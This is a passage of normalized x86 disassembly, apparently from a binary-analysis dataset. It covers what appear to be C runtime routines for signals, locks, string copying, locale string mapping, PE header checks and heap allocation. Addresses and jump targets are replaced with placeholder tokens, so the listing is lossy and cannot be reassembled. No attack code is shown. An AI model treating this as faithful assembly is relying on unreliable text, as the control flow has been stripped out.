mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_100174ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1001750e
push 0x20
push r--data
call sub_100148a0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100155e3
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_100148e5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_100174ca
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1001485b
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10017bb6
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_100154ac
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017675
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_100176b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_100154ac
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1001781d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10015c7f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10015c7f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_10015c2d
mov eax esi
sub_10017892
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_10015c7f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_10015c7f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_10015c2d
mov eax esi
jmp r-xdata
sub_1001795f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1001797a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10015c7f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10015c7f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_10015c2d
mov eax esi
sub_100179dd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_10017a1c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_100134fd
pop ecx
sub_10017a3c
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10017af4
push 0xc
push r--data
call sub_100148a0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_10013dc7
push 0x1e
call sub_10013c18
push 0xff
call sub_10014603
push 0x18
call sub_100144c6
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_10015c7f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_100148e5
retn
push edi
call sub_100134fd
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_100134fd
pop ecx
call sub_10015c7f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017bad
mov eax [ ebp - 0x1c ]
sub_10017bb6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10017af4
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10014880
sub_10017bf0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10017c80
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10019e15
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10019e34
jmp r-xdata
sub_10017c80
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10012771
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10017bf0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10017ce2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10017d12
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10017d42
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10013009
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10018acc
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_100185ae
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10017e00
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10017e40
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10017ed5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_10015c7f
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_10013f17
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_10017f57
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10013537
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100134fd
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_10013f17
pop ecx
call sub_10015c7f
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_10015c7f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10015c3d
pop ecx
mov [ esi ] eax
push esi
call sub_10013f17
pop ecx
test eax eax
je r-xdata
call sub_10015c7f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10015c3d
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_100180a8
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_100180d0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10018110
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10018160
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10014900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_100180d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10018110
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10018220
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10019e40
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1001829a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10017a1c
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10013537
pop ecx
cmp eax ebx
je r-xdata
call sub_10019cd0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10017a1c
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10013537
pop ecx
cmp eax ebx
je r-xdata
call sub_10019cd0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_10018481
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001829a
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100184c7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10018220
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10017a1c
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10013537
pop ecx
cmp eax ebx
je r-xdata
call sub_10019cd0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_100185ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100184c7
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100185ee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_100134fd
push [ esi + 0x8 ]
call sub_100134fd
push [ esi + 0xc ]
call sub_100134fd
push [ esi + 0x10 ]
call sub_100134fd
push [ esi + 0x14 ]
call sub_100134fd
push [ esi + 0x18 ]
call sub_100134fd
push [ esi ]
call sub_100134fd
push [ esi + 0x20 ]
call sub_100134fd
push [ esi + 0x24 ]
call sub_100134fd
push [ esi + 0x28 ]
call sub_100134fd
push [ esi + 0x2c ]
